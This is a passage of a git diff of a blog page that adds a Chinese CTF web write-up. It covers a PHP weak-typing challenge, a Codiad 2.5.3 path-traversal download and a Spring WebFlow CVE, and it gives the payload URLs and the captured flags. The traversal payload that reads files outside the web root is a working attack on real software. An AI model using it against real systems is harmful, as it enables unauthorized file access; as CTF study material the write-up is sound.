$val===<span class="string">"XMAN"</span>?<span class="keyword">die</span>(<span class="string">"Emmm..."</span>):<span class="keyword">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        $c=<span class="number">1</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c)&#123;</div><div class="line">    <span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">    <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>考察php弱类型。payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:8004/index.php?aaa=1abcdef&amp;bbb=&#123;&quot;ccc&quot;:&quot;2018a&quot;,&quot;ddd&quot;:[[1],0]&#125;</div></pre></td></tr></table></figure></p>
+<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;PHP_IS_THE_BEST_LANGUAGE&#125;</div></pre></td></tr></table></figure></p>
+<h1 id="downloaded"><a href="#downloaded" class="headerlink" title="downloaded"></a>downloaded</h1><p>用admin登陆后发现是Codiad 2.5.3，exploit-db上找到poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.exploit-db.com/exploits/36371/</div></pre></td></tr></table></figure></p>
+<p>找flag的位置花了一点时间。最后paylaod:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://challenges.xctf.org.cn:7775/components/filemanager/download.php?path=../../../../../../../../../../../var/www/flag.txt&amp;type=undefined</div></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;D0WnL0D_3v3RYTh1ng_You_Win&#125;</div></pre></td></tr></table></figure>
+<h1 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h1><p>CVE-2017-4971：Spring WebFlow漏洞。到处找poc。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/3.jpg?raw=true" alt=""></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/4.jpg?raw=true" alt=""></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/5.jpg?raw=true" alt=""></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170716/6.jpg?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">XMAN&#123;UGhoiXoeDae6zeethaxoh1eex3xeiJ7y&#125;</div></pre></td></tr></table></figure>
+<p>参考：<a href="https://github.com/Medicean/VulApps/tree/master/s/springwebflow/1" target="_blank" rel="external">https://github.com/Medicean/VulApps/tree/master/s/springwebflow/1</a></p>
 
       
     </div>
@@ -498,23 +461,13 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
-          
-            <a href="/tags/SQL注入/" rel="tag"># SQL注入</a>
-          
-            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
-          
-        </div>
-      
 
       
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/05/16/一次简单的GDB调试/" rel="next" title="一次水水的调试">
-                <i class="fa fa-chevron-left"></i> 一次水水的调试
+              <a href="/2017/07/16/Meenpwn-2017-web-writeup/" rel="next" title="Meenpwn-2017-web-writeup">
+                <i class="fa fa-chevron-left"></i> Meenpwn-2017-web-writeup
               </a>
             
           </div>
@@ -523,8 +476,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/06/17/浅谈php反序列化漏洞/" rel="prev" title="浅谈php反序列化漏洞">
-                浅谈php反序列化漏洞 <i class="fa fa-chevron-right"></i>
+              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
+                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -690,7 +643,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#POC"><span class="nav-number">1.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞"><span class="nav-number">2.</span> <span class="nav-text">漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#危害组件"><span class="nav-number">2.1.</span> <span class="nav-text">危害组件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#传入sql语句"><span class="nav-number">2.2.</span> <span class="nav-text">传入sql语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入过程"><span class="nav-number">2.3.</span> <span class="nav-text">注入过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#成功注入"><span class="nav-number">3.</span> <span class="nav-text">成功注入</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#variacover"><span class="nav-number">1.</span> <span class="nav-text">variacover</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#urldecode"><span class="nav-number">2.</span> <span class="nav-text">urldecode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP"><span class="nav-number">3.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#downloaded"><span class="nav-number">4.</span> <span class="nav-text">downloaded</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#spring"><span class="nav-number">5.</span> <span class="nav-text">spring</span></a></li></ol></div>
             
 
           </div>
